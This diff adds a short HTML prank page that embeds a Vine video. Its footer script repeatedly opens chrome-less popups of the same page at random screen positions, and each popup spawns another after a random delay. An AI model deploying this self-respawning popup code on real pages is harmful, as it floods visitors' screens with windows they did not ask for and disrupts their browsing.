@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head></head>
+  <body>
+    <iframe src="https://vine.co/v/eLTH5zuqw1w/embed/simple?audio=1" width="300" height="300" frameborder="0"></iframe><script src="https://platform.vine.co/static/scripts/embed.js"></script>
+  </body>
+  <footer>
+    <script type="text/javascript">
+      function guid() {
+        function s4() {
+          return Math.floor((1 + Math.random()) * 0x10000)
+            .toString(16)
+            .substring(1);
+        }
+        return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
+          s4() + '-' + s4() + s4() + s4();
+      };
+      function spawnMoose(){
+        window.open(window.location.href, 'moose' + guid(), config='height=300, width=300, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, directories=no, status=no, top=' + Math.ceil((Math.random() * screen.height) + (Math.random() * 100)) + ', left=' + Math.ceil((Math.random() * screen.width) + (Math.random() * 100)));
+      };
+      window.setTimeout(spawnMoose, Math.floor((Math.random() * 10) * 1000));
+    </script>
+  </footer>
+</html>
